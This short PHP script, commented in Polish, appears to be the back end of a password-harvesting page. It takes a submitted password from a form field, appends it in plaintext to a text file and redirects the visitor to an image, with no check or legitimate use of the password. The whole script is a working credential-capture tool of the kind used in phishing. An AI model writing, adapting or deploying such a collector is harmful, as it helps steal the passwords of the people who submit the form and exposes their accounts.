<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Pobranie hasła z formularza
    $haslo = $_POST['haslo'];

    // Określenie pliku, do którego zapisujemy
    $file = 'bratkebratke.txt';

    // Zapisanie hasła do pliku
    file_put_contents($file, "Hasło: " . $haslo . "\n", FILE_APPEND);

    // Możesz przekierować użytkownika po zapisaniu (opcjonalnie)
    header('Location: bratke.png');
    exit();
}
?>
